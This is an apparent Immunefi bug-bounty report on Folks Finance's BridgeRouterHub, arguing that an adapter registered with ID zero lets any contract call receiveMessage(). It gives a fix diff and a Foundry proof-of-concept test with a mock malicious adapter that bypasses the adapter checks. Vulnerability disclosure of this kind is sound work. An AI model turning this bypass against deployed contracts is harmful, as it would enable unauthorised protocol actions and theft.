# Boost \_ Folks Finance 34029 - \[Smart Contract - Medium] Contract fails to mitigate potential critica

Submitted on Sun Aug 04 2024 10:14:52 GMT-0400 (Atlantic Standard Time) by @Obin for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #34029

Report type: Smart Contract

Report severity: Medium

Target: <https://testnet.snowtrace.io/address/0xa9491a1f4f058832e5742b76eE3f1F1fD7bb6837>

Impacts:

* Contract fails to mitigate a potential Critical situation where anyone will be able to call BridgeRouterHub::receiveMessage() "directly".

## Description

## Brief/Intro

The BridgeRouter.sol file is the base contract for BridgeRouterHub.sol and BridgerouterSpoke.sol. BridgeRouterHub contains sensitive functions hence its function calls are restricted. Eg: only pre-inputed IBridgeAdapter contracts / interfaces (by the `MANAGER_ROLE` via `addAdapter` function)would be able to call BridgeRouterHub::receiveMessage(). This is the protocols intended security architecture. However, a potential issue can arise where anyone (any malicious Smart contract) will be able to call this sensitive funcion `BridgeRouterHub::receiveMessage()` which is a gateway for many other senitive executions. The smatr contrat is meant to mitigate itself from possibly reaching this state. Unfortunately it doesnt.

## Impact Details

A really wide range of impacts.

## Note

1. This vulnerbility is not categorized as critical due to protocol `MANAGER_ROLE` error required to achieve critical impact.
2. That pointed out, its still a huge error for Smart contract to potentially allow this. Hence a High
3. Note that the range of potential attacks to be carrired out via this one bug is numerous as atttacker can take any of the actions define in the `enum Action`.

## Mitigation

```diff
+   error adapterIndexMustNotBeZero();
    function addAdapter(uint16 adapterId, IBridgeAdapter adapter) external onlyRole(MANAGER_ROLE) {
        
+       if(adapterId == uint16(0)) revert adapterIndexMustNotBeZero(); //@audit The index for `adapterId` must start from 1 not 0.
        // check if no existing adapter
        if (isAdapterInitialized(adapterId)) revert AdapterInitialized(adapterId); 
        

        // add adapter
        idToAdapter[adapterId] = adapter;
        adapterToId[adapter] = adapterId;
    }
```

## References

Add any relevant links to documentation or code

## Proof of concept

## Proof of Concept

## POC illustration (An overly simplified version of the BridgeRouter used for foundry testing)

### Alteration in BridgeRouter.sol (for simplicity)

```diff
diff --git a/Diff.sol b/Diff.sol
index a8ea541..862431b 100644
--- a/Diff.sol
+++ b/Diff.sol
@@ -1,33 +1,28 @@
-// SPDX-License-Identifier: BUSL-1.1
-pragma solidity 0.8.23;
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+import {AccessControlDefaultAdminRules} from "@openzeppelin/contracts/access/extensions/AccessControlDefaultAdminRules.sol";

-import "@openzeppelin/contracts/access/extensions/AccessControlDefaultAdminRules.sol";
-import "./BridgeMessenger.sol";
-import "./interfaces/IBridgeAdapter.sol";
-import "./interfaces/IBridgeRouter.sol";
 import "./libraries/Messages.sol";

-abstract contract BridgeRouter is IBridgeRouter, AccessControlDefaultAdminRules {
-    bytes32 public constant override MANAGER_ROLE = keccak256("MANAGER");
-    bytes32 public constant override MESSAGE_SENDER_ROLE = keccak256("MESSAGE_SENDER");
-
-    event MessageSucceeded(uint16 adapterId, bytes32 indexed messageId);
-    event MessageFailed(uint16 adapterId, bytes32 indexed messageId, bytes reason);
-    event MessageRetrySucceeded(uint16 adapterId, bytes32 indexed messageId);
-    event MessageRetryFailed(uint16 adapterId, bytes32 indexed messageId, bytes reason);
-    event MessageReverseSucceeded(uint16 adapterId, bytes32 indexed messageId);
-    event MessageReverseFailed(uint16 adapterId, bytes32 indexed messageId, bytes reason);
-    event Withdraw(bytes32 userId, address receiver, uint256 amount);
-
-    error NotEnoughFunds(bytes32 user);
-    error FailedToWithdrawFunds(address recipient, uint256 amount);
-    error ChainUnavailable(uint16 folksChainId);
-    error SenderDoesNotMatch(address messager, address caller);
-    error AdapterInitialized(uint16 adapterId);
-    error AdapterNotInitialized(uint16 adapterId);
-    error AdapterUnknown(IBridgeAdapter adapter);
+// an examplary interface
+interface IBridgeAdapter {
+    function dog() external view returns(bool);
+    function cat() external view returns(bool);
+
+}
+
+contract Counter is AccessControlDefaultAdminRules {
+    bytes32 public constant  MANAGER_ROLE = keccak256("MANAGER");
+    bytes32 public constant  MESSAGE_SENDER_ROLE = keccak256("MESSAGE_SENDER");
+
+    error AdapterInitialized(uint);
+    error AdapterNotInitialized(uint);
     error MessageAlreadySeen(bytes32 messageId);
-    error MessageUnknown(bytes32 messageId);
+    error AdapterUnknown(IBridgeAdapter adapter);
+
+    event successfullyBypassedAllrevertChecksAbove();
+
+    uint256 public number = 13; //testing


```

### POC Foundry

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import { IBridgeAdapter,Counter, Messages} from "../src/Counter.sol";


// a MockBridgeAdapter
contract MockBridgeAdapter {
    
    function cat(Messages.MessageReceived memory payload) external  {
        
    }
}

contract MockMaliciousBridgeAdapter is IBridgeAdapter {
    Counter target;
    constructor(address _target) {
        target = Counter(_target);
    }
    function cat(Messages.MessageReceived memory payload) external {
        // calls contract with malicious payload
        target.receiveMessage(payload);

    }
    
}

contract CounterTest is Test {
    Counter public counter;
    address admin = makeAddr("admin");
    //address manager = makeAddr('manager');

    

    function setUp() public {
        //vm.startPrank(admin);
        counter = new Counter(admin);
        // counter.grantRole(counter.MANAGER_ROLE(),manager); // Already set
    }

    
    // anyOne would be able to call `function receiveMessage()`
    function testContractVulnerableDueToAdapterIdZeroIllustration() public {
        vm.startPrank(admin);
        // adds 5 instances of adapter (For instance)
        for(uint i; i < 5; i++){ //change i =1 to break test hence 0 not instantiated
            
            IBridgeAdapter adapter = IBridgeAdapter(address(new MockBridgeAdapter()));
            counter.addAdapter(uint16(i),adapter);
            console.log('addapterInstances',address(adapter));
        }
        assertTrue(counter.isAdapterInitialized(0));
        IBridgeAdapter addapterInstance = counter.getAdapter(0);

        vm.stopPrank();

        //======illustrating any contract can call RouterHub::receiveMessage()

        //instantiating arbitrary malicious contract
        MockMaliciousBridgeAdapter maliciouscontract = new MockMaliciousBridgeAdapter(address(counter));
        //wraps contract with interface
        IBridgeAdapter wrappedMaliciouscontract = IBridgeAdapter(address(maliciouscontract));
        
        //assert not included by `MANAGER_ROLE` via `addAdapter()`
        assertEq(0, counter.adapterToId(wrappedMaliciouscontract));
        Messages.MessageReceived memory arbitraryNum; // not set just illustrating
        
        vm.expectEmit();

        //Emmiting this shows contract was successfully called by malicious contract (not added via `addAdapter()`)
        // @audit Critical
        emit Counter.successfullyBypassedAllrevertChecksAbove();
        maliciouscontract.cat(arbitraryNum);
        console.log('wrappedMaliciouscontract',address(wrappedMaliciouscontract));
        
        
        
    }

    /**
    =========Signatures
    function isAdapterInitialized(uint16 adapterId) public view returns (bool) 
    function getAdapter(uint16 adapterId) public view returns (IBridgeAdapter)
    function addAdapter(uint16 adapterId, IBridgeAdapter adapter) external
     */
}

```
